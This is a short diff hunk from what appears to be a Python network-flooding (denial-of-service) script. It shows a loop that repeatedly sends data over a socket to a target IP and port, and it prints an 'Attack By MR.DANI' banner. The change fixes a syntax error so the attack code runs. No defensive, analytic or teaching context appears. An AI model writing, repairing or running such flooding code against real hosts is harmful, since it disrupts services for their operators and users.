@@ -49,7 +49,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))")
+			print(i +" \033[92mAttack By MR.DANI To IP %s|%s"%(orgip,port))
 		except:
 			s.close()
 			print("[*] Down lagi Asu")
